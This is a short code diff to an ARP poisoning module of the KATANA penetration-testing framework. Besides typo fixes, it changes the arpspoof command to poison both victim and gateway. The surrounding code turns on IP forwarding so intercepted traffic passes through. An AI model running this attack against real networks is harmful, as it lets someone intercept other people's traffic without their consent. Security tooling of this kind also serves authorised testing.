@@ -1,6 +1,6 @@
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # @KATANA                       #
-# Modules   : ARP Poisoning     #
+# Module    : ARP Poisoning     #
 # Script by : RedToor           #
 # Date      : 26/08/2015        #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
@@ -77,8 +77,8 @@ def arpp(run):
             d.run()
             try:
                 print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
-                print " "+Alr+" Startin ARP Poisoning."
-                os.system("arpspoof -i "+defaultint+" -t "+defaultipv)
+                print " "+Alr+" Starting ARP Poisoning."
+                os.system("arpspoof -i "+defaultint+" -t "+defaultipv+" -r "+defaultgat)
             except:
                 Errors.Errors(event=sys.exc_info(), info=False)
         else:
